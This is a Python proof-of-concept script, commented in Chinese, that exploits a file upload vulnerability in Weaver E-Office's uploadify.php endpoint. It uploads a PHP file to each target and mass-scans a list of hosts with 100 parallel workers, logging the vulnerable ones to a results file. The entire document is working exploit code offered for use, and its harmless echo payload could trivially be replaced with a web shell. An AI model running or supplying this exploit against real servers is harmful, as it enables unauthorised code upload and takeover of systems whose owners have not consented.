def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="泛微E-Office uploadify.php后台文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #处理资产，添加线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('1.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/inc/jquery/uploadify/uploadify.php'
    url = target + url_payload
    # print(url)
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Length':'227',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Content-Type':'multipart/form-data; boundary=gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s'
        }
    data = f'--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"12333.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo 123456;?>\r\n\r\n--gfgea1saasf5dsgg5fd5fds15gf5kj51vd1s--'
    try:
        res = requests.post(url=target+url_payload,headers=headers,data=data,verify=False)
        path = f"{target}/attachment/{{回显的数字}}/12333.php"
        if res.status_code == 200 and len(res.content) > 0:
            print(f"[+]{target}存在漏洞")
            # print(f"[+]请访问{path}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
        else:
            print(f"[-]{target}不存在漏洞！！")
            return False
    except Exception as e:
        print(f"Error occurred: {e}")


        
if __name__ == '__main__':
    main()
